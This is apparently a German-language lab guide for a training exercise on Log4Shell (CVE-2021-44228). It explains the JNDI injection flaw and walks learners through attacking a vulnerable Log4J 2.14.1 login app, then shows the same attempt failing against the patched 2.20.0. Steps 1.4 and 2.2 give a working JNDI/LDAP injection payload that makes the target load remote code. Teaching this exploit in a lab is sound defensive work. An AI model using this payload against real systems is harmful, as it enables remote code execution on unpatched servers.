# Übungsanleitung

## **Log4Shell**

### Allgemeines

- **Log4J**

    - Log4J ist eine Java-Bibliothek, die Softwareentwicklern dabei hilft, Fehler und Prozesse in einer Software zu verfolgen. Es erfasst und speichert Fehlerberichte oder Zwischenergebnisse, die als "Logs" bezeichnet werden. Diese Logs können später eingesehen werden, um besser zu verstehen, wie die Software in bestimmten Situationen reagiert hat. Log4J läuft auf der freien Open Source Software der Apache Software Foundation und gilt als Vorreiter für Login-Frameworks und wird in den meisten Java basierten Programmen als Standard verwendet. 


- **Log4Shell**

    - Die Schwachstelle in Log4J wird als Log4Shell oder CVE-2021-44228 bezeichnet und wurde Ende 2021 bekannt gemacht. Sie basiert auf einer Injektionsschwachstelle in dem Java-Logging-Framework Log4J. Ein Angreifer könnte diese Schwachstelle nutzen und damit einzelne Programme auf der Opferanwendung ausführen oder gar das System vollständig übernehmen. Dadurch könnte zum Beispiel weitere Schadsoftware nachgeladen oder vertrauliche Daten aus dem System geschöpft werden. 

    - Im Prinzip nutzt Log4Shell eine Schwachstelle im Java Naming and Directory Interface (JNDI) aus. Auf dieses Interface greift das Framework Log4J nämlich zu. Über diese Schwachstelle ist es möglich, bösartigen Remote-Code auf einem betroffenen System oder Anwendung auszuführen. Der Angreifer fügt manipulierte Payloads in die Protokollnachrichten ein, die von Log4J protokolliert werden. Angreifer können den Pfad zu dem bösartigen Code in ihre Payloads schreiben und Log4J interpretiert die manipulierten Nachrichten nicht als einfachen Text, sondern als Java-Objekte. Log4J lädt den bösartigen Schadcode über JNDI zur Laufzeit aus dem Netz nach und führt ihn aus.


### Komponenten 

- ### Angreifer
    
  - **LDAP-Server**

    - Ein LDAP-Server ist ein Verzeichnisdienst und fungiert im Prinzip wie ein Telefonbuch: er kann Einträge von Benutzern oder Konfigurationen, aber auch IP-Adressen von beispielsweise Datenbanken enthalten. In diesem Versuch wird der LDAP-Server vom Angreifer kontrolliert und ist so manipuliert, dass er der Opferanwendung einen Verzeichniseintrag mit Klassenname des Schadcodes und die Adresse des HTTP-Servers zurückliefert. Infolgedessen startet die Java-Opferanwendung eine Webverbindung mit dem HTTP-Server des Angreifers. Diese Webverbindung wird ermöglicht, da Java dynamisch ist und Code aus dem Netz ziehen kann (Classloader).

  - **HTTP-Server**
    
    - Der HTTP-server nimmt Anfragen von der Anwendung entgegen und wird ebenfalls vom Angreifer kontrolliert. Er liefert den Bytecode des Schadcodes zurück und sorgt dafür, dass der Angreifer diesen Code beim Opfer einschleust. Der HTTP-Server hostet .class-Dateien, die für eine Remote-Code-Ausführung verwendet werden.
    

- ### Angriffsziel

    - **Login**

        - Die Java-Anwendung Login ist ein einfaches Programm, dass man nutzen kann, um sich einzuloggen. Die Anwendung fordert den Nutzer erst auf, den Benutzernamen einzugeben. Anschließend wird das Passwort erfordert. Existiert der Benutzer nicht, oder das Passwort ist falsch, so wird im Hintergrund eine Fehlermeldung mit dem Log4J-Framework geloggt. Die für die Sicherheitslücke Log4Shell benötigte Log4J-Version (2.14.1) wird hier verwendet.


### 💡Hilfreiche Befehle💡

```
sudo <eigentlicher Befehl>
```
- Je nach Rechtestruktur und Betriebssystem (Linux) muss man Kommandos das Schlüsselwort 'sudo' davorstellen, um den Befehl auszuführen. 

```
ls
```
- Steht für "list", zeigt den Inhalt eines Verzeichnisses an

```
cd
```
- Steht für "change directory", zu deutsch "Verzeichnis wechseln"
- cd .. -> wechselt bspw. in das übergeordnete Verzeichnis

```
cat
```
- Kann dazu genutzt werden um den Inhalt einer Datei auszugeben


# :star: Start

<h2 style="color:red">  1. Part: Log4Shell-Angriff mit Sicherheitslücke </h2>

In diesem Versuch werden Sie die verwundbare Anwendung 'Login' durch eine Injektionsschwachstelle angreifen und können so Schadcode auf der Anwendung ausführen lassen.

Beachten Sie, dass Sie die richtigen Terminals (nicht die Terminals mit *_patched) für diesen Part verwenden.

<h3 style="color:lightblue">Schritt 1.1 - Anwendung ausprobieren</h3>

Jetzt kann die Anwendung im Terminal 'Login' ganz normal ausprobiert werden. Sie können versuchen sich mit dem Account 'Klaus' & Passwort 'Klaus1' einzuloggen. 
Nun können Sie sich wieder ausloggen, damit das Programm Sie wieder auffordert, sich einzuloggen. 
Geben Sie nun einen falschen Namen ein, damit das Programm eine Log-Nachricht im Hintergrund speichert.

<h3 style="color:lightblue">Schritt 1.2 - Log-File der Anwendung auslesen</h3>

Die Anwendung erstellt eine log-file, in der die Logs gespeichert werden. Im Terminal 'Log-File' können Sie nun die Log-File der Anwendung auslesen.


Vorerst müssen Sie mit folgendem Befehl die .log-Datei innerhalb der Verzeichnisse suchen:

```bash
ls
```

Nutzen Sie zum Navigieren innerhalb der Ordner diesen Befehl:

```bash
cd
```

Mit dem Befehl können Sie die Log-datei auslesen, wenn Sie sich im richtigen Verzeichnis befinden

```bash
cat <name_logDatei>.log
```

In der log-file sollten Sie nun die Log-Nachricht ihrer falschen Eingabe finden. (Beweis: Anwendung nutzt Log4J-Framework).

<h3 style="color:lightblue">Schritt 1.3 - Log des HTTP-Server</h3>

In dem Terminal des HTTP-Servers werden Sie sehen, dass der HTTP-Server auf port 8081 läuft. Sobald Sie nun im Schritt 1.4 den Exploit durchführen, können Sie hier sehen, dass der HTTP-Server eine HTTP-Request der Opfer-Anwendung 'Login' erhält.

<h3 style="color:lightblue">Schritt 1.4 - Exploit </h3>

Um den Log4Shell-Angriff durchführen zu können, müssen Sie in das Eingabefeld (Benutzername oder Passwort) einen präparierten JNDI-Befehl eingeben.

```bash
${jndi:ldap://<HOSTNAME_LDAP>:<PORTNUMMER_LDAP>/cn=BadCode,dc=src}
```

Falls Sie den präparierten JNDI-Befehl richtig eingegeben haben, sollte jetzt der Schadcode auf der Anwendung ausgeführt werden und Sie sollten eine Ausgabe in Dauerschleife sehen.
Der HTTP-Server sollte nun die Nachricht ausgeben, dass eine Request der Opferanwendung angekommen ist und eine Response an die Opferanwendung rausgeschickt wurde. 

Hinweis: Den Hostnamen und den Port des LDAP-Servers finden Sie innerhalb einer Datei in den Verzeichnissen des Versuchs. 

## :star: Sie haben nun das Ende der Log4Shell-Übung Part 1 erreicht






<h2 style="color:red">  2. Part: Log4Shell-Angriff ohne Sicherheitslücke (Gepatchte Log4J-Version)</h2>

Die Komponenten sind die gleichen wie im ersten Part der Übung. Die einzige Änderung ist in der Komponente 'Login'. Dort wird jetzt im zweiten Part der Übung die Log4J-Version (2.20.0) verwendet. Diese Log4J-Version ist die gepatchte Version und ermöglicht keine JNDI-Lookups mehr. Somit schließt es die Sicherheitslücke im Log4J-Framework. 

In Part 2 des Versuchs werden Sie versuchen, die Anwendung 'Login' durch eine Injektionsschwachstelle anzugreifen und Schadcode auf der Anwendung ausführen zu lassen.

Beachten Sie, dass Sie die richtigen Terminals (_patched) für diesen Part verwenden.

<h3 style="color:lightblue">Schritt 2.1 - Log des HTTP-Servers öffnen </h3>

In dem Terminal des HTTP-Servers werden Sie sehen, dass der HTTP-Server auf port 8082 läuft. Sobald Sie nun im Schritt 2.2 versuchen den Exploit durchzuführen, können Sie hier sehen, dass der HTTP-Server läuft, aber nie eine HTTP-Request von der Opferanwendung erhalten wird.

<h3 style="color:lightblue">Schritt 2.2 - Exploit </h3>

Um die Anwendung auf eine Sicherheitslücke zu untersuchen, geben Sie nun den selben präparierten JNDI-Befehl wie im ersten Teil der Übung ein.

```bash
${jndi:ldap://<HOSTNAME_LDAP>:<PORTNUMMER_LDAP>/cn=BadCode,dc=src}
```

Falls Sie den präparierten JNDI-Befehl richtig eingegeben haben, sollte jetzt der Schadcode NICHT auf der Anwendung ausgeführt werden.

Hinweis: Den Hostnamen und den Port des LDAP-Servers finden Sie innerhalb einer Datei in den Verzeichnissen des Versuchs. Der LDAP-Server des Versuchs mit der gepatchen Version läuft auf einem anderem Port wie der LDAP-Server im Part 1.

<h3 style="color:lightblue">Schritt 2.3 - Log-File der Anwendung auslesen </h3>

Die Anwendung erstellt eine log-file, in der die Logs gespeichert werden. Im Terminal 'Log-File' können Sie nun die Log-File der Anwendung auslesen.


Vorerst müssen Sie mit folgendem Befehl die .log-Datei innerhalb der Verzeichnisse suchen:

```bash
ls
```

Nutzen Sie zum Navigieren innerhalb der Ordner diesen Befehl:

```bash
cd
```

Mit dem Befehl können Sie die Log-datei auslesen, wenn Sie sich im richtigen Verzeichnis befinden

```bash
cat <name_logDatei>.log
```

In der log-file sollte der JNDI-Lookup nur als String mitgeloggt werden. (Beweis: Anwendung nutzt Log4J-Framework mit gepatchter Version).

## :star: Sie haben nun das Ende der Log4Shell-Übung Part 2 erreicht